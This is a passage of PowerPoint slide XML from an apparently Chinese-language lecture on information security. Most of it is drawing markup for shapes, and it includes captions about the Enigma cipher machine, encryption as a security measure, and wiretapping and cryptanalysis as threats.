                      <a:gd name="T17" fmla="*/ 41 w 41"/>
                      <a:gd name="T18" fmla="*/ 255 h 255"/>
                    </a:gdLst>
                    <a:ahLst/>
                    <a:cxnLst>
                      <a:cxn ang="T10">
                        <a:pos x="T0" y="T1"/>
                      </a:cxn>
                      <a:cxn ang="T11">
                        <a:pos x="T2" y="T3"/>
                      </a:cxn>
                      <a:cxn ang="T12">
                        <a:pos x="T4" y="T5"/>
                      </a:cxn>
                      <a:cxn ang="T13">
                        <a:pos x="T6" y="T7"/>
                      </a:cxn>
                      <a:cxn ang="T14">
                        <a:pos x="T8" y="T9"/>
                      </a:cxn>
                    </a:cxnLst>
                    <a:rect l="T15" t="T16" r="T17" b="T18"/>
                    <a:pathLst>
                      <a:path w="41" h="255">
                        <a:moveTo>
                          <a:pt x="0" y="14"/>
                        </a:moveTo>
                        <a:lnTo>
                          <a:pt x="41" y="0"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="41" y="243"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="14"/>
                        </a:lnTo>
                        <a:close/>
                      </a:path>
                    </a:pathLst>
                  </a:custGeom>
                  <a:solidFill>
                    <a:srgbClr val="606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7" name="Group 57"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="5398" y="2067"/>
                  <a:ext cx="124" cy="252"/>
                  <a:chOff x="5398" y="2067"/>
                  <a:chExt cx="124" cy="252"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="28" name="Oval 58"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5408" y="2067"/>
                    <a:ext cx="114" cy="247"/>
                  </a:xfrm>
                  <a:prstGeom prst="ellipse">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29" name="Oval 59"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5398" y="2072"/>
                    <a:ext cx="115" cy="247"/>
                  </a:xfrm>
                  <a:prstGeom prst="ellipse">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:solidFill>
                    <a:srgbClr val="A0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30" name="Oval 60"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5464" y="2184"/>
                    <a:ext cx="31" cy="53"/>
                  </a:xfrm>
                  <a:prstGeom prst="ellipse">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:solidFill>
                    <a:srgbClr val="E0E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31" name="Oval 61"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5472" y="2187"/>
                    <a:ext cx="22" cy="42"/>
                  </a:xfrm>
                  <a:prstGeom prst="ellipse">
                    <a:avLst/>
                  </a:pr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grpSp>
          </p:grpSp>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="11" name="Group 62"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="5529" y="2057"/>
                <a:ext cx="441" cy="261"/>
                <a:chOff x="5529" y="2057"/>
                <a:chExt cx="441" cy="261"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="13" name="Group 63"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="5529" y="2057"/>
                  <a:ext cx="166" cy="261"/>
                  <a:chOff x="5529" y="2057"/>
                  <a:chExt cx="166" cy="261"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="20" name="Oval 64"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5529" y="2073"/>
                    <a:ext cx="166" cy="245"/>
                  </a:xfrm>
                  <a:prstGeom prst="ellipse">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:solidFill>
                    <a:srgbClr val="606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21" name="Oval 65"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5529" y="2057"/>
                    <a:ext cx="166" cy="245"/>
                  </a:xfrm>
                  <a:prstGeom prst="ellipse">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22" name="Oval 66"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5536" y="2068"/>
                    <a:ext cx="152" cy="232"/>
                  </a:xfrm>
                  <a:prstGeom prst="ellipse">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:solidFill>
                    <a:srgbClr val="A0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grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="23" name="Group 67"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5543" y="2152"/>
                    <a:ext cx="40" cy="67"/>
                    <a:chOff x="5543" y="2152"/>
                    <a:chExt cx="40" cy="67"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="24" name="Oval 68"/>
                    <p:cNvSpPr>
                      <a:spLocks noChangeArrowheads="1"/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5543" y="2152"/>
                      <a:ext cx="40" cy="67"/>
                    </a:xfrm>
                    <a:prstGeom prst="ellipse">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25" name="Oval 69"/>
                    <p:cNvSpPr>
                      <a:spLocks noChangeArrowheads="1"/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5547" y="2166"/>
                      <a:ext cx="32" cy="53"/>
                    </a:xfrm>
                    <a:prstGeom prst="ellipse">
                      <a:avLst/>
                    </a:pr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grpSp>
            </p:grpSp>
            <p:grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="14" name="Group 70"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="5682" y="2138"/>
                  <a:ext cx="288" cy="99"/>
                  <a:chOff x="5682" y="2138"/>
                  <a:chExt cx="288" cy="99"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="15" name="Freeform 71"/>
                  <p:cNvSpPr>
                    <a:spLocks/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5682" y="2152"/>
                    <a:ext cx="288" cy="85"/>
                  </a:xfrm>
                  <a:custGeom>
                    <a:avLst/>
                    <a:gdLst>
                      <a:gd name="T0" fmla="*/ 0 w 1151"/>
                      <a:gd name="T1" fmla="*/ 0 h 257"/>
                      <a:gd name="T2" fmla="*/ 0 w 1151"/>
                      <a:gd name="T3" fmla="*/ 0 h 257"/>
                      <a:gd name="T4" fmla="*/ 0 w 1151"/>
                      <a:gd name="T5" fmla="*/ 0 h 257"/>
                      <a:gd name="T6" fmla="*/ 0 w 1151"/>
                      <a:gd name="T7" fmla="*/ 0 h 257"/>
                      <a:gd name="T8" fmla="*/ 0 w 1151"/>
                      <a:gd name="T9" fmla="*/ 0 h 257"/>
                      <a:gd name="T10" fmla="*/ 0 w 1151"/>
                      <a:gd name="T11" fmla="*/ 0 h 257"/>
                      <a:gd name="T12" fmla="*/ 0 w 1151"/>
                      <a:gd name="T13" fmla="*/ 0 h 257"/>
                      <a:gd name="T14" fmla="*/ 0 w 1151"/>
                      <a:gd name="T15" fmla="*/ 0 h 257"/>
                      <a:gd name="T16" fmla="*/ 0 w 1151"/>
                      <a:gd name="T17" fmla="*/ 0 h 257"/>
                      <a:gd name="T18" fmla="*/ 0 w 1151"/>
                      <a:gd name="T19" fmla="*/ 0 h 257"/>
                      <a:gd name="T20" fmla="*/ 0 w 1151"/>
                      <a:gd name="T21" fmla="*/ 0 h 257"/>
                      <a:gd name="T22" fmla="*/ 0 w 1151"/>
                      <a:gd name="T23" fmla="*/ 0 h 257"/>
                      <a:gd name="T24" fmla="*/ 0 w 1151"/>
                      <a:gd name="T25" fmla="*/ 0 h 257"/>
                      <a:gd name="T26" fmla="*/ 0 w 1151"/>
                      <a:gd name="T27" fmla="*/ 0 h 257"/>
                      <a:gd name="T28" fmla="*/ 0 w 1151"/>
                      <a:gd name="T29" fmla="*/ 0 h 257"/>
                      <a:gd name="T30" fmla="*/ 0 w 1151"/>
                      <a:gd name="T31" fmla="*/ 0 h 257"/>
                      <a:gd name="T32" fmla="*/ 0 w 1151"/>
                      <a:gd name="T33" fmla="*/ 0 h 257"/>
                      <a:gd name="T34" fmla="*/ 0 w 1151"/>
                      <a:gd name="T35" fmla="*/ 0 h 257"/>
                      <a:gd name="T36" fmla="*/ 0 w 1151"/>
                      <a:gd name="T37" fmla="*/ 0 h 257"/>
                      <a:gd name="T38" fmla="*/ 0 w 1151"/>
                      <a:gd name="T39" fmla="*/ 0 h 257"/>
                      <a:gd name="T40" fmla="*/ 0 w 1151"/>
                      <a:gd name="T41" fmla="*/ 0 h 257"/>
                      <a:gd name="T42" fmla="*/ 0 w 1151"/>
                      <a:gd name="T43" fmla="*/ 0 h 257"/>
                      <a:gd name="T44" fmla="*/ 0 w 1151"/>
                      <a:gd name="T45" fmla="*/ 0 h 25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51"/>
                      <a:gd name="T70" fmla="*/ 0 h 257"/>
                      <a:gd name="T71" fmla="*/ 1151 w 1151"/>
                      <a:gd name="T72" fmla="*/ 257 h 25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51" h="257">
                        <a:moveTo>
                          <a:pt x="0" y="0"/>
                        </a:moveTo>
                        <a:lnTo>
                          <a:pt x="1151" y="85"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="1151" y="129"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="1075" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="921" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="921" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="844" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="844" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="769" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="769" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="615" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="615" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="538" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="461" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="384" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="307" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="307" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="230" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="230" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="154" y="194"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="76" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="257"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="0"/>
                        </a:lnTo>
                        <a:close/>
                      </a:path>
                    </a:pathLst>
                  </a:custGeom>
                  <a:solidFill>
                    <a:srgbClr val="606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72"/>
                  <p:cNvSpPr>
                    <a:spLocks/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5682" y="2138"/>
                    <a:ext cx="288" cy="85"/>
                  </a:xfrm>
                  <a:custGeom>
                    <a:avLst/>
                    <a:gdLst>
                      <a:gd name="T0" fmla="*/ 0 w 1151"/>
                      <a:gd name="T1" fmla="*/ 0 h 255"/>
                      <a:gd name="T2" fmla="*/ 0 w 1151"/>
                      <a:gd name="T3" fmla="*/ 0 h 255"/>
                      <a:gd name="T4" fmla="*/ 0 w 1151"/>
                      <a:gd name="T5" fmla="*/ 0 h 255"/>
                      <a:gd name="T6" fmla="*/ 0 w 1151"/>
                      <a:gd name="T7" fmla="*/ 0 h 255"/>
                      <a:gd name="T8" fmla="*/ 0 w 1151"/>
                      <a:gd name="T9" fmla="*/ 0 h 255"/>
                      <a:gd name="T10" fmla="*/ 0 w 1151"/>
                      <a:gd name="T11" fmla="*/ 0 h 255"/>
                      <a:gd name="T12" fmla="*/ 0 w 1151"/>
                      <a:gd name="T13" fmla="*/ 0 h 255"/>
                      <a:gd name="T14" fmla="*/ 0 w 1151"/>
                      <a:gd name="T15" fmla="*/ 0 h 255"/>
                      <a:gd name="T16" fmla="*/ 0 w 1151"/>
                      <a:gd name="T17" fmla="*/ 0 h 255"/>
                      <a:gd name="T18" fmla="*/ 0 w 1151"/>
                      <a:gd name="T19" fmla="*/ 0 h 255"/>
                      <a:gd name="T20" fmla="*/ 0 w 1151"/>
                      <a:gd name="T21" fmla="*/ 0 h 255"/>
                      <a:gd name="T22" fmla="*/ 0 w 1151"/>
                      <a:gd name="T23" fmla="*/ 0 h 255"/>
                      <a:gd name="T24" fmla="*/ 0 w 1151"/>
                      <a:gd name="T25" fmla="*/ 0 h 255"/>
                      <a:gd name="T26" fmla="*/ 0 w 1151"/>
                      <a:gd name="T27" fmla="*/ 0 h 255"/>
                      <a:gd name="T28" fmla="*/ 0 w 1151"/>
                      <a:gd name="T29" fmla="*/ 0 h 255"/>
                      <a:gd name="T30" fmla="*/ 0 w 1151"/>
                      <a:gd name="T31" fmla="*/ 0 h 255"/>
                      <a:gd name="T32" fmla="*/ 0 w 1151"/>
                      <a:gd name="T33" fmla="*/ 0 h 255"/>
                      <a:gd name="T34" fmla="*/ 0 w 1151"/>
                      <a:gd name="T35" fmla="*/ 0 h 255"/>
                      <a:gd name="T36" fmla="*/ 0 w 1151"/>
                      <a:gd name="T37" fmla="*/ 0 h 255"/>
                      <a:gd name="T38" fmla="*/ 0 w 1151"/>
                      <a:gd name="T39" fmla="*/ 0 h 255"/>
                      <a:gd name="T40" fmla="*/ 0 w 1151"/>
                      <a:gd name="T41" fmla="*/ 0 h 255"/>
                      <a:gd name="T42" fmla="*/ 0 w 1151"/>
                      <a:gd name="T43" fmla="*/ 0 h 255"/>
                      <a:gd name="T44" fmla="*/ 0 w 1151"/>
                      <a:gd name="T45" fmla="*/ 0 h 25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51"/>
                      <a:gd name="T70" fmla="*/ 0 h 255"/>
                      <a:gd name="T71" fmla="*/ 1151 w 1151"/>
                      <a:gd name="T72" fmla="*/ 255 h 25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51" h="255">
                        <a:moveTo>
                          <a:pt x="0" y="0"/>
                        </a:moveTo>
                        <a:lnTo>
                          <a:pt x="1075" y="0"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="1151" y="126"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="1075" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="921" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="921" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="844" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="844" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="769" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="769" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="615" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="615" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="538" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="461" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="384" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="307" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="307" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="230" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="230" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="154" y="191"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="76" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="255"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="0"/>
                        </a:lnTo>
                        <a:close/>
                      </a:path>
                    </a:pathLst>
                  </a:custGeom>
                  <a:solidFill>
                    <a:srgbClr val="A0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73"/>
                  <p:cNvSpPr>
                    <a:spLocks/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5707" y="2159"/>
                    <a:ext cx="263" cy="21"/>
                  </a:xfrm>
                  <a:custGeom>
                    <a:avLst/>
                    <a:gdLst>
                      <a:gd name="T0" fmla="*/ 0 w 1054"/>
                      <a:gd name="T1" fmla="*/ 0 h 64"/>
                      <a:gd name="T2" fmla="*/ 0 w 1054"/>
                      <a:gd name="T3" fmla="*/ 0 h 64"/>
                      <a:gd name="T4" fmla="*/ 0 w 1054"/>
                      <a:gd name="T5" fmla="*/ 0 h 64"/>
                      <a:gd name="T6" fmla="*/ 0 w 1054"/>
                      <a:gd name="T7" fmla="*/ 0 h 64"/>
                      <a:gd name="T8" fmla="*/ 0 w 1054"/>
                      <a:gd name="T9" fmla="*/ 0 h 64"/>
                      <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T15" fmla="*/ 0 w 1054"/>
                      <a:gd name="T16" fmla="*/ 0 h 64"/>
                      <a:gd name="T17" fmla="*/ 1054 w 1054"/>
                      <a:gd name="T18" fmla="*/ 64 h 64"/>
                    </a:gdLst>
                    <a:ahLst/>
                    <a:cxnLst>
                      <a:cxn ang="T10">
                        <a:pos x="T0" y="T1"/>
                      </a:cxn>
                      <a:cxn ang="T11">
                        <a:pos x="T2" y="T3"/>
                      </a:cxn>
                      <a:cxn ang="T12">
                        <a:pos x="T4" y="T5"/>
                      </a:cxn>
                      <a:cxn ang="T13">
                        <a:pos x="T6" y="T7"/>
                      </a:cxn>
                      <a:cxn ang="T14">
                        <a:pos x="T8" y="T9"/>
                      </a:cxn>
                    </a:cxnLst>
                    <a:rect l="T15" t="T16" r="T17" b="T18"/>
                    <a:pathLst>
                      <a:path w="1054" h="64">
                        <a:moveTo>
                          <a:pt x="0" y="0"/>
                        </a:moveTo>
                        <a:lnTo>
                          <a:pt x="1018" y="0"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="1054" y="64"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="64"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="0"/>
                        </a:lnTo>
                        <a:close/>
                      </a:path>
                    </a:pathLst>
                  </a:custGeom>
                  <a:solidFill>
                    <a:srgbClr val="808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Rectangle 74"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5711" y="2195"/>
                    <a:ext cx="249" cy="4"/>
                  </a:xfrm>
                  <a:prstGeom prst="rect">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:solidFill>
                    <a:srgbClr val="8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
                <p:nvSpPr>
                  <p:cNvPr id="19" name="Rectangle 75"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5702" y="2142"/>
                    <a:ext cx="249" cy="3"/>
                  </a:xfrm>
                  <a:prstGeom prst="rect">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:solidFill>
                    <a:srgbClr val="8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grpSp>
          </p:grpSp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="12" name="Freeform 76"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="5483" y="2174"/>
                <a:ext cx="79" cy="48"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 314"/>
                  <a:gd name="T1" fmla="*/ 0 h 145"/>
                  <a:gd name="T2" fmla="*/ 0 w 314"/>
                  <a:gd name="T3" fmla="*/ 0 h 145"/>
                  <a:gd name="T4" fmla="*/ 0 w 314"/>
                  <a:gd name="T5" fmla="*/ 0 h 145"/>
                  <a:gd name="T6" fmla="*/ 0 w 314"/>
                  <a:gd name="T7" fmla="*/ 0 h 145"/>
                  <a:gd name="T8" fmla="*/ 0 w 314"/>
                  <a:gd name="T9" fmla="*/ 0 h 145"/>
                  <a:gd name="T10" fmla="*/ 0 w 314"/>
                  <a:gd name="T11" fmla="*/ 0 h 145"/>
                  <a:gd name="T12" fmla="*/ 0 w 314"/>
                  <a:gd name="T13" fmla="*/ 0 h 145"/>
                  <a:gd name="T14" fmla="*/ 0 w 314"/>
                  <a:gd name="T15" fmla="*/ 0 h 145"/>
                  <a:gd name="T16" fmla="*/ 0 w 314"/>
                  <a:gd name="T17" fmla="*/ 0 h 145"/>
                  <a:gd name="T18" fmla="*/ 0 w 314"/>
                  <a:gd name="T19" fmla="*/ 0 h 145"/>
                  <a:gd name="T20" fmla="*/ 0 w 314"/>
                  <a:gd name="T21" fmla="*/ 0 h 145"/>
                  <a:gd name="T22" fmla="*/ 0 w 314"/>
                  <a:gd name="T23" fmla="*/ 0 h 1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4"/>
                  <a:gd name="T37" fmla="*/ 0 h 145"/>
                  <a:gd name="T38" fmla="*/ 314 w 314"/>
                  <a:gd name="T39" fmla="*/ 145 h 1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4" h="145">
                    <a:moveTo>
                      <a:pt x="0" y="52"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="8" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="72" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="127" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="236" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="278" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="305" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="314" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="308" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="294" y="0"/>
                    </a:lnTo>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:noFill/>
              <a:ln w="15875">
                <a:solidFill>
                  <a:srgbClr val="C0C0C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78" name="Picture 4" descr="enigmagr"/>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5486438" y="3174925"/>
            <a:ext cx="244157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9" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4114838" y="5756200"/>
            <a:ext cx="4695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1409" tIns="45705" rIns="91409" bIns="45705">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="446088">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088">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088">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088">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088">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088"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088"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088"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088"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转轮密码机</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>ENIGMA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1944</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>年装备德国海军</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="80" name="Picture 4" descr="enigmag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8838" y="3327325"/>
            <a:ext cx="244157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363367" y="4288765"/>
            <a:ext cx="4572001" cy="430887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全措施：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>加密</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="矩形 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="336588" y="3683104"/>
            <a:ext cx="5099508" cy="430887"/>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en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全威胁：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>搭线窃听、密码学分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39270169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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
